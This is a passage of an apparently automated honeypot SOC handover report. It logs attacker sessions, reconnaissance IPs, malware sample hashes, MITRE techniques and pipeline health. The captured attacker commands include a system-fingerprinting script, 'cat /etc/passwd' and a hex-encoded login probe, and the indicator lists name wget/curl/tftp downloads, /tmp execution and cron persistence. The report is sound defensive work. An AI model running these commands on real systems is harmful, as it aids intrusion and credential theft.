| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:48:14` | `cowrie.session.connect` |
| `2026-07-21 18:48:15` | `cowrie.client.version` |
| `2026-07-21 18:48:15` | `cowrie.client.kex` |
| `2026-07-21 18:48:17` | `cowrie.login.success` |
| `2026-07-21 18:48:19` | `cowrie.session.params` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.success` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:19` | `cowrie.command.input` |
| `2026-07-21 18:48:20` | `cowrie.log.closed` |
| `2026-07-21 18:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02e383da408

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:51 |
| **Last Seen** | 2026-07-21 18:52 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:51:29` | `cowrie.session.connect` |
| `2026-07-21 18:51:29` | `cowrie.client.version` |
| `2026-07-21 18:51:29` | `cowrie.client.kex` |
| `2026-07-21 18:51:34` | `cowrie.login.success` |
| `2026-07-21 18:51:57` | `cowrie.session.params` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.success` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:51:57` | `cowrie.command.input` |
| `2026-07-21 18:52:00` | `cowrie.log.closed` |
| `2026-07-21 18:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3f5d00a2d76

| Field | Detail |
|---|---|
| **Source IP** | `47.82.122[.]57` |
| **First Seen** | 2026-07-21 18:52 |
| **Last Seen** | 2026-07-21 18:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:52:13` | `cowrie.session.connect` |
| `2026-07-21 18:52:14` | `cowrie.telnet.option` |
| `2026-07-21 18:52:14` | `cowrie.telnet.option` |
| `2026-07-21 18:52:14` | `cowrie.login.success` |
| `2026-07-21 18:52:15` | `cowrie.session.params` |
| `2026-07-21 18:52:15` | `cowrie.telnet.option` |
| `2026-07-21 18:52:15` | `cowrie.telnet.option` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.failed` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.failed` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.failed` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:15` | `cowrie.command.input` |
| `2026-07-21 18:52:16` | `cowrie.log.closed` |
| `2026-07-21 18:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.82.122[.]57` to AbuseIPDB if not already reported
- [ ] Block `47.82.122[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05dbc1b12d51

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:54 |
| **Last Seen** | 2026-07-21 18:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:54:50` | `cowrie.session.connect` |
| `2026-07-21 18:54:51` | `cowrie.client.version` |
| `2026-07-21 18:54:51` | `cowrie.client.kex` |
| `2026-07-21 18:54:57` | `cowrie.login.success` |
| `2026-07-21 18:54:59` | `cowrie.session.params` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.success` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:54:59` | `cowrie.command.input` |
| `2026-07-21 18:55:00` | `cowrie.log.closed` |
| `2026-07-21 18:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-21 17:14 | 2026-07-21 18:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | **3** | 2026-07-21 18:08 | 2026-07-21 18:10 | 3m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-21 18:23 | 2026-07-21 18:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-21 17:01 | 2026-07-21 17:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]155` | **3** | 2026-07-21 17:56 | 2026-07-21 17:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]193` | **3** | 2026-07-21 16:55 | 2026-07-21 16:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-07-21 17:09 | 2026-07-21 18:10 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-07-21 17:27 | 2026-07-21 18:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `216.70.97[.]74` | **2** | 2026-07-21 17:34 | 2026-07-21 18:25 | 1m | 0 | `T1592` | 🟢 LOW |
| `74.235.100[.]142` | **2** | 2026-07-21 17:53 | 2026-07-21 17:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-07-21 17:37 | 2026-07-21 17:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.112.194[.]160` | 1 | 2026-07-21 18:01 | 2026-07-21 18:02 | 16s | 0 | `T1592` | 🟢 LOW |
| `125.72.150[.]250` | 1 | 2026-07-21 16:57 | 2026-07-21 16:57 | 4s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-07-21 18:24 | 2026-07-21 18:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.243.148[.]53` | 1 | 2026-07-21 17:39 | 2026-07-21 17:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.155.109[.]44` | 1 | 2026-07-21 18:12 | 2026-07-21 18:12 | 12s | 0 | `T1592` | 🟢 LOW |
| `201.163.73[.]93` | 1 | 2026-07-21 18:25 | 2026-07-21 18:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.154.143[.]136` | 1 | 2026-07-21 17:04 | 2026-07-21 17:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.255.126[.]29` | 1 | 2026-07-21 18:28 | 2026-07-21 18:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-07-21 18:42 | 2026-07-21 18:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]184` | 1 | 2026-07-21 16:55 | 2026-07-21 16:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]33` | 1 | 2026-07-21 17:59 | 2026-07-21 18:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]60` | 1 | 2026-07-21 17:42 | 2026-07-21 17:43 | 9s | 1 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `163.223.244[.]3` | IN | BRNET INFOCOM PRIVATE LIMITED | **100** ⚠️ | 19 |
| `115.241.228[.]34` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 50 |
| `178.178.194[.]131` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `223.82.97[.]51` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `166.62.102[.]109` | US | GoDaddy.com, LLC | **100** ⚠️ | 23 |
| `178.216.165[.]187` | RU | Morton-Telekom Ltd | **100** ⚠️ | 50 |
| `113.140.95[.]250` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `201.163.73[.]93` | MX | Alestra, S. de R.L. de C.V. | **100** ⚠️ | 29 |
| `171.243.148[.]53` | VN | Viettel Group | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 114 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 102 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 19 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 19 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 18 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 157 cases |
| Tool 34  | Credential Extractor        | ✅ 142 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 82 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (8.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 102 priority case(s) shown individually · 23 recon entry/entries in table (11 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-21T19:37:47Z_
